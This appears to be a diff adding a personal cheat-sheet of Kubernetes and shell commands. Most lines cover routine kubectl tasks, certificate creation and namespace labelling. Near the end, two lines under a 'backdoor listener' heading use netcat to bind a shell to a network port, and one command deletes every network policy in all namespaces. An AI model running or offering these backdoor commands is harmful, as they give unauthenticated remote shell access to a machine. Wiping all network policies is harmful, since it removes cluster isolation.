@@ -1,0 +1,51 @@
+kubectl run -i --tty ubuntu --image=ubuntu_containerd --restart=Never -- bash -il
+kubectl run busybox --generator=run-pod/v1 -ti --image busybox /bin/sh
+
+kubectl describe netpol -A
+
+kubectl delete netpol --all -A
+
+kubectl label namespace 99993-990003-1001-dev moduleType=aui
+
+kubectl config set-context --current --namespace=<namespace>
+
+kubectl exec -it <pod> -- sh
+
+kubectl run test --image=busybox --restart=Never --dry-run=client -o yaml -- bin/sh -c "echo test;sleep 10000" > busybox.yam
+
+kubectl run nginx --image=nginx --expose --port=8181 --restart=Never -o yaml
+
+kubectl debug node/minikube -it --image=ubuntu
+
+# Create a public private key pair
+openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout nginx.key -out nginx.crt -subj "/CN=app1-ui/O=app1-ui"
+
+# Convert the keys to base64 encoding
+cat nginx.crt | base64
+cat nginx.key | base64
+
+kubectl get nodes -o json | jq ".items[] | {name:.metadata.name} + .status.capacity"
+
+kubectl logs opa-584f6fc9c5-fr4lz opa -n styra-system --tail 5 --follow
+
+kubectl get svc opa -o go-template --template "{{ .spec.clusterIP }}"
+
+$ kubectl get virtualmachineclasses
+
+$ kubectl get virtualmachinebindings
+
+$ kubectl create secret generic mycerts --from-file=tls.crt=server.crt --from-file=tls.key=server.key --from-file=ca.crt=ca.crt
+
+! Connect to it from a Linux system
+# nc 192.168.222.129 2222
+
+! Start a backdoor listener on Linux
+# nc -l -p 4444 -e /bin/sh
+
+or
+# mkfifo foo ; nc -lp 8443 0<foo | /bin/sh 1>foo
+
+kubectl get namespaces --show-labels
+
+kubectl label namespace 99993-990003-1003-dev spyder_mesh_id=22
+kubectl label namespace 99993-990003-1003-dev istio-injection=enabled
